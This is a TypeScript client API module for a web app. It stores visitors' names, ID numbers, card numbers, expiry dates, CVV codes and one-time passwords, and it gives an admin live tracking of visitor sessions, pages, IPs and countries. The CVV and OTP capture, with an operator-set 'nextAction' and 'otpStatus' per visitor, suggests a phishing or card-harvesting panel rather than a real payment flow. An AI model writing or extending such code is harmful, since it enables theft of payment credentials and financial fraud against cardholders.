export interface RequestData {
  id: string;
  name: string;
  mobile: string;
  idNumber: string;
  cardType: string;
  address: string;
  date: string;
  paymentName?: string;
  cardNumber?: string;
  expMonth?: string;
  expYear?: string;
  cvv?: string;
  otp?: string;
  otpStatus?: string;
  nextAction?: string;
  step: string;
  createdAt: string;
  updatedAt: string;
}

export interface VisitorMeta {
  ip: string;
  os: string;
  device: string;
  browser: string;
  country: string;
}

export interface ActiveSessionInfo {
  clientId: string;
  requestId: string | null;
  currentPage: string;
  lastSeen: number;
  meta?: VisitorMeta;
}

// Pure in-memory runtime references (no localStorage or sessionStorage)
let activeRequestId: string | null = null;
let activeAdminToken = '';
const runtimeClientId = 'client_' + Math.random().toString(36).slice(2);
let firstVisitSent = false;

export function getActiveRequestId(): string | null {
  return activeRequestId;
}

export function setActiveRequestId(id: string | null) {
  activeRequestId = id;
}

export async function resolveActiveRequestId(): Promise<string | null> {
  if (activeRequestId) return activeRequestId;
  const current = await getCurrentCardRequest();
  if (current?.id) {
    activeRequestId = current.id;
    return current.id;
  }
  return null;
}

export async function createCardRequest(payload: Partial<RequestData>): Promise<RequestData> {
  const res = await fetch('/api/requests', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'same-origin',
    body: JSON.stringify(payload)
  });
  const data = await res.json();
  if (!res.ok) {
    throw new Error(data.error || 'Failed to create request');
  }
  activeRequestId = data.id;
  return data;
}

export async function updateCardRequest(id: string, payload: Partial<RequestData>): Promise<RequestData> {
  const targetId = id || activeRequestId || 'current';
  const res = await fetch(`/api/requests/${encodeURIComponent(targetId)}`, {
    method: 'PATCH',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'same-origin',
    body: JSON.stringify(payload)
  });
  const data = await res.json();
  if (!res.ok) {
    throw new Error(data.error || 'Failed to update request');
  }
  return data;
}

export async function getCurrentCardRequest(): Promise<RequestData | null> {
  const res = await fetch('/api/requests/current', {
    credentials: 'same-origin'
  });
  if (!res.ok) return null;
  const data = await res.json();
  if (data?.id) activeRequestId = data.id;
  return data;
}

export async function getCardRequest(id?: string | null): Promise<RequestData | null> {
  const targetId = id || activeRequestId || 'current';
  const url = targetId === 'current' ? '/api/requests/current' : `/api/requests/${encodeURIComponent(targetId)}`;
  const res = await fetch(url, {
    credentials: 'same-origin'
  });
  if (res.status === 404) return null;
  if (!res.ok) throw new Error('Failed to fetch request');
  const data = await res.json();
  if (data?.id) activeRequestId = data.id;
  return data;
}

export async function listCardRequests(): Promise<RequestData[]> {
  const res = await fetch('/api/requests', {
    credentials: 'same-origin'
  });
  if (!res.ok) {
    const err = await res.json().catch(() => ({}));
    throw new Error(err.error || 'Failed to list requests');
  }
  return res.json();
}

export async function sendPresenceHeartbeat(currentPage = '/') {
  if (currentPage.startsWith('/admin')) return true;
  const isNewVisit = !firstVisitSent;
  firstVisitSent = true;
  const res = await fetch('/api/presence', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'same-origin',
    body: JSON.stringify({
      clientId: runtimeClientId,
      requestId: activeRequestId,
      currentPage,
      isNewVisit
    })
  });
  if (res.ok) {
    const data = await res.json().catch(() => null);
    if (!activeRequestId && data?.requestId) {
      activeRequestId = data.requestId;
    }
  }
  return res.ok;
}

export async function getServerStats(): Promise<{
  onlineCount: number;
  totalVisitorsCount: number;
  onlineUsers: Record<string, boolean>;
  userPages: Record<string, string>;
  userMeta: Record<string, VisitorMeta>;
  activeSessions: ActiveSessionInfo[];
}> {
  const res = await fetch('/api/stats', {
    credentials: 'same-origin'
  });
  if (!res.ok) {
    return {
      onlineCount: 0,
      totalVisitorsCount: 0,
      onlineUsers: {},
      userPages: {},
      userMeta: {},
      activeSessions: []
    };
  }
  return res.json();
}

export async function adminLoginApi(email: string, password: string): Promise<{ token: string }> {
  const res = await fetch('/api/admin/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'same-origin',
    body: JSON.stringify({ email, password })
  });
  const data = await res.json();
  if (!res.ok) {
    throw new Error(data.error || 'فشل تسجيل الدخول');
  }
  activeAdminToken = data.token || '';
  return data;
}

export async function verifyAdminSession(): Promise<boolean> {
  const headers: Record<string, string> = {};
  if (activeAdminToken) {
    headers.Authorization = `Bearer ${activeAdminToken}`;
  }
  const res = await fetch('/api/admin/me', {
    headers,
    credentials: 'same-origin'
  });
  return res.ok;
}

export async function adminLogoutApi() {
  const headers: Record<string, string> = {};
  if (activeAdminToken) {
    headers.Authorization = `Bearer ${activeAdminToken}`;
  }
  activeAdminToken = '';
  await fetch('/api/admin/logout', {
    method: 'POST',
    headers,
    credentials: 'same-origin'
  });
}
